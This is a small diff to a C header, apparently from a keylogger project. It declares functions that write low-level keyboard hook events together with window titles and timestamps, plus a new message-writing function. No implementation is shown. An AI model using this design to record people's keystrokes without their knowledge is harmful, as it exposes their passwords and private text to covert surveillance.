@@ -1,6 +1,8 @@
 #pragma once
 
-void InitWritter();
+#include "stdafx.h"
 
-void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, PKBDLLHOOKSTRUCT keyEvent);
+void InitWritter();
+void WriteMessage(CHAR *message);
+void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, time_t lastTime, time_t currentTime, PKBDLLHOOKSTRUCT keyEvent);
 void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent);
